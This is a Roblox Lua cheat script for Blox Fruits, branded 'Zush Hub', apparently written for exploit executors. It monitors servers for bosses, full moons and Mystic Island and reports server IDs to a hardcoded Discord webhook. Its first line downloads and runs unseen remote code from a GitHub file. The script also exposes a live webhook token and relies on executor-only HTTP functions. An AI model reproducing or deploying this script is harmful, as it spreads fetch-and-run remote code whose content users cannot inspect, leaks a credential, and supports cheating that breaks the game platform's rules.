loadstring(game:HttpGet("https://raw.githubusercontent.com/moonnosd2344/folder/refs/heads/main/cuongdimra3442"))()

wait(1)

-- Khai báo dịch vụ cần thiết
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local Lighting = game:GetService("Lighting")

-- Khởi tạo biến toàn cục
if _G.Keep_Job == nil then
    _G.Keep_Job = {}
end
if _G.Keep_JobX == nil then
    _G.Keep_JobX = {}
end

-- Khai báo biến cho trạng thái
MysticIsland_S = false
FullMoon_S = false

-- Function để gửi webhook
function PostWebhook(webhookUrl, messageData)
    -- Bảo vệ khi không có URL
    if not webhookUrl or webhookUrl == "" then
        print("Lỗi: Webhook")
        return false
    end
    
    -- Chọn hàm request phù hợp với môi trường
    local request = http_request or request or HttpPost or syn.request
    if not request then
        warn("Không tìm thấy phương thức HTTP request hỗ trợ")
        return false
    end
    
    -- Thử gửi HTTP request
    local success, response = pcall(function()
        return request({
            Url = webhookUrl,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode(messageData)
        })
    end)
    
    if success then
        print("Webhook gửi thành công")
        return true
    else
        warn("Lỗi khi gửi webhook: " .. tostring(response))
        return false
    end
end

-- Hàm lấy emoji trạng thái trăng
function GetMoonEmoji(moonPhase)
    if moonPhase == "5/5" then return "🌕" -- Trăng tròn
    elseif moonPhase == "4/5" then return "🌖" -- 75%
    elseif moonPhase == "3/5" then return "🌗" -- 50%
    elseif moonPhase == "2/5" then return "🌘" -- 25%
    elseif moonPhase == "1/5" then return "🌑" -- 15%
    else return "🌚" -- 0%
    end
end

-- Hàm lấy màu tương ứng với trạng thái
function GetStatusColor(status)
    if status == "5/5" then -- Trăng tròn
        return 0xFFD700 -- Vàng
    elseif status == "4/5" then -- 75%
        return 0xFFA500 -- Cam
    elseif status == "3/5" then -- 50%
        return 0x1E90FF -- Xanh dương
    elseif status == "2/5" or status == "1/5" then -- 25% hoặc 15%
        return 0x808080 -- Xám
    elseif status == "Boss" then
        return 0xFF0000 -- Đỏ
    elseif status == "Mystic" then
        return 0x00FF00 -- Xanh lá
    else
        return 0x36393F -- Đen Discord
    end
end

-- Function gửi thông tin Server Status
function SendServerStatus(webhookUrl)
    -- Kiểm tra trạng thái Mystic Island
    local mysticStatus = MysticIsland_S and "✅ Đảo Bí Ẩn đã xuất hiện 🏝️" or "❌ Đảo Bí Ẩn chưa xuất hiện"
    
    -- Xác định trạng thái mặt trăng
    local moonPhase = "0/5"
    local moonStatus = "0%"
    
    if Lighting.Sky.MoonTextureId == "http://www.roblox.com/asset/?id=9709149431" then
        moonPhase = "5/5"
        moonStatus = "Full Moon"
    elseif Lighting.Sky.MoonTextureId == "http://www.roblox.com/asset/?id=9709149052" then
        moonPhase = "4/5"
        moonStatus = "75%"
    elseif Lighting.Sky.MoonTextureId == "http://www.roblox.com/asset/?id=9709143733" then
        moonPhase = "3/5"
        moonStatus = "50%"
    elseif Lighting.Sky.MoonTextureId == "http://www.roblox.com/asset/?id=9709150401" then
        moonPhase = "2/5"
        moonStatus = "25%"
    elseif Lighting.Sky.MoonTextureId == "http://www.roblox.com/asset/?id=9709149680" then
        moonPhase = "1/5"
        moonStatus = "15%"
    else
        moonStatus = "0%"
    end
    
    -- Kiểm tra boss
    local bossStatus = "❌ Không tìm thấy boss nào"
    local foundBoss = nil
    local bossHealth = 0
    
    -- Danh sách boss cần kiểm tra
    local bossList = {"rip_indra True Form", "Cursed Captain", "Darkbeard", "Don Swan", "Soul Reaper", "Dough King"}
    
    for _, bossName in pairs(bossList) do
        -- Kiểm tra trong workspace
        if game.Workspace.Enemies:FindFirstChild(bossName) then
            foundBoss = bossName
            local enemy = game.Workspace.Enemies:FindFirstChild(bossName)
            if enemy and enemy:FindFirstChild("Humanoid") then
                bossHealth = math.floor((enemy.Humanoid.Health / enemy.Humanoid.MaxHealth) * 100)
            end
            break
        -- Kiểm tra trong ReplicatedStorage
        elseif game.ReplicatedStorage:FindFirstChild(bossName) then
            foundBoss = bossName
            bossHealth = 100
            break
        end
    end
    
    if foundBoss then
        bossStatus = "✅ " .. foundBoss .. " (" .. bossHealth .. "% HP)"
    end
    
    -- Lấy danh sách người chơi
    local players = {}
    for _, player in pairs(Players:GetChildren()) do
        if not table.find(players, player.Name) then
            table.insert(players, player.Name)
        end
    end
    
    -- Lấy thời gian trong game
    local gameTime = tostring(Lighting.TimeOfDay)
    local isNight = false
    
    -- Kiểm tra xem có phải là đêm không
    local hour = tonumber(string.sub(gameTime, 1, 2))
    if hour >= 18 or hour < 6 then
        isNight = true
    end
    
    -- Nhận emoji trăng
    local moonEmoji = GetMoonEmoji(moonPhase)
    
    -- Tạo dữ liệu webhook với giao diện đẹp hơn
    local data = {
        ["embeds"] = {
            {
                ["color"] = GetStatusColor(moonPhase),
                ["title"] = "🎮 Zush Hub (Premium) • Webhook 🎮",
                ["description"] = "```diff\n+ Dữ liệu được gửi đến từ bản premium\n```\n**Tham gia máy chủ này:**\n```lua\ngame:GetService(\"ReplicatedStorage\").__ServerBrowser:InvokeServer(\"teleport\",\"" .. game.JobId .. "\")\n```",
                ["fields"] = {
                    {
                        ["name"] = "🆔 ID Máy Chủ",
                        ["value"] = "```fix\n" .. tostring(game.JobId) .. "\n```",
                        ["inline"] = false
                    },
                    {
                        ["name"] = moonEmoji .. " Trạng Thái Trăng",
                        ["value"] = "```yaml\n" .. moonPhase .. " | " .. moonStatus .. " | " .. gameTime .. "\n```",
                        ["inline"] = true
                    },
                    {
                        ["name"] = "👥 Người Chơi",
                        ["value"] = "```ini\n[" .. tostring(#players) .. "/" .. Players.MaxPlayers .. "]\n```",
                        ["inline"] = true
                    },
                    {
                        ["name"] = "🏝️ Mirage Island",
                        ["value"] = "```diff\n" .. (MysticIsland_S and "+ " or "- ") .. mysticStatus .. "\n```",
                        ["inline"] = false
                    },
                    {
                        ["name"] = "👹 Trạng Thái Boss",
                        ["value"] = "```diff\n" .. (foundBoss and "+ " or "- ") .. bossStatus .. "\n```",
                        ["inline"] = false
                    }
                },
                ["author"] = {
                    ["name"] = "🏴‍☠️ Zush Hub | Thông Báo 🏴‍☠️",
                    ["icon_url"] = "https://i.imgur.com/VoRa0fl.png"
                },
                ["thumbnail"] = {
                    ["url"] = "https://tr.rbxcdn.com/9fc8e93e9068499dbad9349f77bd2ee9/150/150/Image/Png"
                },
                ["image"] = {
                    ["url"] = "https://wallpapercave.com/wp/wp11727097.jpg"
                },
                ["footer"] = {
                    ["text"] = "🔮 Zush Hub Premium | " .. os.date("%d/%m/%Y %H:%M:%S"),
                    ["icon_url"] = "https://i.imgur.com/VoRa0fl.png"
                },
                ["timestamp"] = DateTime.now():ToIsoDate()
            }
        }
    }
    
    -- Gửi webhook
    return PostWebhook(webhookUrl, data)
end

-- URL webhook chính
local WEBHOOK_URL = "https://discord.com/api/webhooks/1363081613390647336/a_KvZIIOC03Gr5RSlf087_f5suhs4ci1qyqfLlkpOXc6p9nWkj-aBDIlI9RIbcHX_3AL"

-- Chức năng chính
function StartMonitoring()
    -- Xác định thế giới hiện tại
    local Three_World = false
    local New_World = false
    
    -- Kiểm tra thế giới (cần điều chỉnh dựa trên cách Blox Fruits xác định thế giới)
    if game.PlaceId == 7449423635 or game.PlaceId == 2753915549 then
        New_World = true
    elseif game.PlaceId == 4442272183 then
        Three_World = true
    end
    
    print("Bắt đầu giám sát: Three_World=" .. tostring(Three_World) .. ", New_World=" .. tostring(New_World))
    
    -- Giám sát thế giới thứ 3
    if Three_World then
        spawn(function()
            while true do
                pcall(function()
                    -- Kiểm tra Mystic Island
                    MysticIsland_S = game:GetService("Workspace").Map:FindFirstChild("MysticIsland") ~= nil
                    
                    -- Kiểm tra Full Moon
                    FullMoon_S = Lighting.Sky.MoonTextureId == "http://www.roblox.com/asset/?id=9709149431" and #Players:GetChildren() <= 7
                    
                    -- Kiểm tra boss Indra
                    if game.Workspace.Enemies:FindFirstChild('rip_indra True Form') or game.ReplicatedStorage:FindFirstChild('rip_indra True Form') then
                        if #Players:GetChildren() <= 9 and not table.find(_G.Keep_JobX, tostring(game.JobId)) then
                            table.insert(_G.Keep_JobX, tostring(game.JobId))
                            SendServerStatus(WEBHOOK_URL)
                        end
                    end
                    
                    -- Gửi thông báo Full Moon khi ít người chơi
                    if #Players:GetChildren() <= 3 then
                        SendServerStatus(WEBHOOK_URL)
                    end
                    
                    -- Kiểm tra điều kiện đặc biệt để gửi thông báo
                    if FullMoon_S and MysticIsland_S and not table.find(_G.Keep_Job, tostring(game.JobId)) 
                       and Lighting.LightingLayers.Night.Intensity.Value == 1 then
                        table.insert(_G.Keep_Job, tostring(game.JobId))
                        SendServerStatus(WEBHOOK_URL)
                    elseif FullMoon_S and not table.find(_G.Keep_Job, tostring(game.JobId)) 
                           and Lighting.LightingLayers.Night.Intensity.Value == 1 then
                        table.insert(_G.Keep_Job, tostring(game.JobId))
                        SendServerStatus(WEBHOOK_URL)
                    elseif MysticIsland_S and not table.find(_G.Keep_Job, tostring(game.JobId)) then
                        table.insert(_G.Keep_Job, tostring(game.JobId))
                        SendServerStatus(WEBHOOK_URL)
                    end
                end)
                
                wait(10) -- Chờ 10 giây giữa các lần kiểm tra
            end
        end)
    -- Giám sát thế giới thứ 2
    elseif New_World then
        spawn(function()
            while true do
                pcall(function()
                    -- Kiểm tra boss Cursed Captain và Darkbeard
                    local foundBoss = false
                    if game.Workspace.Enemies:FindFirstChild('Cursed Captain') or game.ReplicatedStorage:FindFirstChild('Cursed Captain') then
                        if #Players:GetChildren() <= 10 and not table.find(_G.Keep_JobX, tostring(game.JobId)) then
                            table.insert(_G.Keep_JobX, tostring(game.JobId))
                            foundBoss = true
                        end
                    end
                    
                    if game.Workspace.Enemies:FindFirstChild('Darkbeard') or game.ReplicatedStorage:FindFirstChild('Darkbeard') then
                        if #Players:GetChildren() <= 10 and not table.find(_G.Keep_JobX, tostring(game.JobId)) then
                            table.insert(_G.Keep_JobX, tostring(game.JobId))
                            foundBoss = true
                        end
                    end
                    
                    if foundBoss then
                        SendServerStatus(WEBHOOK_URL)
                    end
                end)
                
                wait(10) -- Chờ 10 giây giữa các lần kiểm tra
            end
        end)
    end
end

-- Chạy script giám sát
StartMonitoring()

-- Thông báo cho người dùng biết script đã được khởi chạy
print("Check thành công")

-- Gửi thông báo kiểm tra để xác nhận webhook đang hoạt động
SendServerStatus(WEBHOOK_URL)
